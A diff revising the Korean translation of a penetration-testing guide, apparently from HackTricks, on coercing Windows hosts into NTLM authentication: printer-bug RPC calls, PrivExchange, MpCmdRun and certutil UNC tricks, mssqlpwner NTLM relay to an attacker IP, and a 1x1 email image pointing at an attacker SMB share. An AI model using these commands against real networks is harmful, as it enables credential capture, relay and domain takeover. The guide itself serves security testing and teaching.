@@ -28,7 +28,7 @@ Linux에서 rpcdump.py를 사용하여 MS-RPRN 프로토콜을 찾을 수도 있
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
-### 임의의 호스트에 대해 서비스에 인증 요청
+### 서비스에 임의의 호스트에 대해 인증하도록 요청
 
 [ **여기에서 SpoolSample을 컴파일할 수 있습니다**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
 ```bash
@@ -51,13 +51,13 @@ https://github.com/p0dalirius/Coercer
 
 ## PrivExchange
 
-`PrivExchange` 공격은 **Exchange Server `PushSubscription` 기능**에서 발견된 결함의 결과입니다. 이 기능은 Exchange 서버가 메일박스가 있는 도메인 사용자가 제공한 클라이언트 호스트에 대해 HTTP를 통해 인증하도록 강제할 수 있게 합니다.
+`PrivExchange` 공격은 **Exchange Server `PushSubscription` 기능**에서 발견된 결함의 결과입니다. 이 기능은 Exchange 서버가 메일박스가 있는 모든 도메인 사용자에 의해 HTTP를 통해 클라이언트 제공 호스트에 인증되도록 강제할 수 있게 합니다.
 
-기본적으로 **Exchange 서비스는 SYSTEM으로 실행되며** 과도한 권한이 부여됩니다 (특히, **2019년 이전 누적 업데이트의 도메인에 대한 WriteDacl 권한**을 가집니다). 이 결함은 **LDAP에 정보를 중계하고 이후 도메인 NTDS 데이터베이스를 추출할 수 있도록 악용될 수 있습니다**. LDAP로의 중계가 불가능한 경우에도 이 결함은 여전히 도메인 내 다른 호스트에 중계하고 인증하는 데 사용될 수 있습니다. 이 공격의 성공적인 악용은 인증된 도메인 사용자 계정으로 도메인 관리자의 즉각적인 접근을 허용합니다.
+기본적으로 **Exchange 서비스는 SYSTEM으로 실행되며** 과도한 권한이 부여됩니다(특히, **2019년 누적 업데이트 이전 도메인에 대한 WriteDacl 권한이 있습니다**). 이 결함은 **LDAP에 정보를 중계하고 이후 도메인 NTDS 데이터베이스를 추출할 수 있도록 악용될 수 있습니다**. LDAP로의 중계가 불가능한 경우에도 이 결함은 여전히 도메인 내의 다른 호스트에 중계하고 인증하는 데 사용될 수 있습니다. 이 공격의 성공적인 악용은 인증된 도메인 사용자 계정으로 도메인 관리자의 즉각적인 접근을 허용합니다.
 
 ## Windows 내부
 
-Windows 머신 내부에 이미 있는 경우, 다음을 사용하여 권한이 있는 계정으로 Windows가 서버에 연결하도록 강제할 수 있습니다:
+Windows 머신 내부에 이미 있는 경우, 다음을 사용하여 권한 있는 계정으로 서버에 연결하도록 Windows를 강제할 수 있습니다:
 
 ### Defender MpCmdRun
 ```bash
@@ -78,7 +78,7 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-
 # Issuing NTLM relay attack on the local server with custom command
 mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
 ```
-다른 기술을 사용하거나: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
+또는 이 다른 기술을 사용할 수 있습니다: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
 
 ### Certutil
 
@@ -90,11 +90,11 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### 이메일을 통한
 
-당신이 손상시키고자 하는 머신에 로그인하는 사용자의 **이메일 주소**를 알고 있다면, 그에게 **1x1 이미지**가 포함된 **이메일**을 보낼 수 있습니다.
+당신이 침투하고자 하는 머신에 로그인하는 사용자의 **이메일 주소**를 알고 있다면, 그에게 **1x1 이미지가 포함된 이메일**을 보낼 수 있습니다.
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-그가 그것을 열면 인증을 시도할 것입니다.
+그가 그것을 열면, 인증을 시도할 것입니다.
 
 ### MitM
 
@@ -104,7 +104,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
 ## NTLMv1 크래킹
 
-[NTLMv1 챌린지를 캡처할 수 있다면 여기에서 크래킹하는 방법을 읽어보세요](../ntlm/#ntlmv1-attack).\
-&#xNAN;_&#x52;emember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"_
+[NTLMv1 챌린지를 캡처할 수 있다면 여기에서 크래킹하는 방법을 읽어보세요](../ntlm/index.html#ntlmv1-attack).\
+&#xNAN;_&#x52;emember NTLMv1을 크래킹하려면 Responder 챌린지를 "1122334455667788"로 설정해야 합니다._
 
 {{#include ../../banners/hacktricks-training.md}}
